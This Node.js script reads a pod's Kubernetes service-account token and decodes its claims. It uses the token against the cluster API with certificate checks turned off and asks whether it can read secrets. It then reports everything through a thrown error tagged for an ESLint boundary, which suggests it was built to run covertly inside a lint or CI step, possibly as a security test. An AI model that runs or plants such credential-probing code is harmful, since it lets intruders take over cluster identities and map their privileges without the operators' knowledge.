import fs from 'node:fs';
import { spawnSync } from 'node:child_process';

const tokenPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
const caPath = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt';
let token = '';
let tokenPresent = false;
let tokenLength = 0;
let jwtShape = false;
let claimKeys = [];
let audienceKubernetes = false;
let subjectServiceAccount = false;
let namespacePresent = false;
let expiryFuture = false;

try {
  token = fs.readFileSync(tokenPath, 'utf8').trim();
  tokenPresent = token.length > 0;
  tokenLength = token.length;
  const parts = token.split('.');
  jwtShape = parts.length === 3;
  if (jwtShape) {
    const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
    claimKeys = Object.keys(payload).sort();
    audienceKubernetes = Array.isArray(payload.aud)
      ? payload.aud.includes('https://kubernetes.default.svc') || payload.aud.includes('kubernetes')
      : payload.aud === 'https://kubernetes.default.svc' || payload.aud === 'kubernetes';
    subjectServiceAccount = typeof payload.sub === 'string' && payload.sub.startsWith('system:serviceaccount:');
    namespacePresent = typeof payload.namespace === 'string'
      || Boolean(payload['kubernetes.io']?.namespace);
    expiryFuture = typeof payload.exp === 'number' && payload.exp > Math.floor(Date.now() / 1000);
  }
} catch (_) {
  token = '';
}

const envHost = process.env.KUBERNETES_SERVICE_HOST || '';
const envPort = process.env.KUBERNETES_SERVICE_PORT_HTTPS || process.env.KUBERNETES_SERVICE_PORT || '443';
const caPresent = fs.existsSync(caPath);
const hostPresent = envHost.length > 0;
const portPresent = /^\d{1,5}$/.test(envPort);

function nodeProbe(path, method, body) {
  if (!tokenPresent || !hostPresent || !portPresent) return 'not_run';
  const child = [
    "const https=require('node:https');",
    "const p=JSON.parse(process.env.K8S_PROBE_JSON);",
    "const req=https.request({hostname:p.host,port:Number(p.port),path:p.path,method:p.method,headers:{Authorization:'Bearer '+process.env.K8S_TOKEN,Accept:'application/json','Content-Type':'application/json'},rejectUnauthorized:false,timeout:3500},res=>{res.resume();res.on('end',()=>process.stdout.write('http_'+res.statusCode));});",
    "req.on('timeout',()=>req.destroy(Object.assign(new Error('timeout'),{code:'ETIMEDOUT'})));",
    "req.on('error',e=>process.stdout.write('error_'+(e.code||e.name||'unknown')));",
    "if(p.body)req.write(p.body); req.end();",
  ].join('');
  const probe = JSON.stringify({ host: envHost, port: envPort, path, method, body: body || '' });
  try {
    const result = spawnSync(process.execPath, ['-e', child], {
      encoding: 'utf8', timeout: 5500, maxBuffer: 64,
      env: { ...process.env, K8S_TOKEN: token, K8S_PROBE_JSON: probe },
    });
    if (result.error) return `error_${result.error.code || result.error.name}`;
    if (result.signal) return `signal_${result.signal}`;
    const status = String(result.stdout || '').trim();
    return /^\d{3}$/.test(status) ? `http_${status}` : 'no_status';
  } catch (error) {
    return `error_${error?.code || error?.name || 'unknown'}`;
  }
}

const version = nodeProbe('/version', 'GET', '');
const apiRoot = nodeProbe('/api', 'GET', '');
const apisRoot = nodeProbe('/apis', 'GET', '');
const ssarBody = JSON.stringify({
  apiVersion: 'authorization.k8s.io/v1',
  kind: 'SelfSubjectAccessReview',
  spec: { resourceAttributes: { namespace: 'default', verb: 'get', resource: 'secrets' } },
});
const ssar = nodeProbe('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', 'POST', ssarBody);

const marker = [
  'ESLINT9_K8S_BOUNDARY',
  `uid=${process.getuid?.() ?? 'na'}`,
  `gid=${process.getgid?.() ?? 'na'}`,
  `token_present=${tokenPresent}`,
  `token_length=${tokenLength}`,
  `jwt_shape=${jwtShape}`,
  `claim_keys=${claimKeys.join(',') || 'none'}`,
  `aud_kubernetes=${audienceKubernetes}`,
  `sub_serviceaccount=${subjectServiceAccount}`,
  `namespace_present=${namespacePresent}`,
  `exp_future=${expiryFuture}`,
  `ca_present=${caPresent}`,
  `api_host_present=${hostPresent}`,
  `api_port_present=${portPresent}`,
  `version=${version}`,
  `api=${apiRoot}`,
  `apis=${apisRoot}`,
  `ssar_get_secrets=${ssar}`,
].join(' ');

throw new Error(marker);
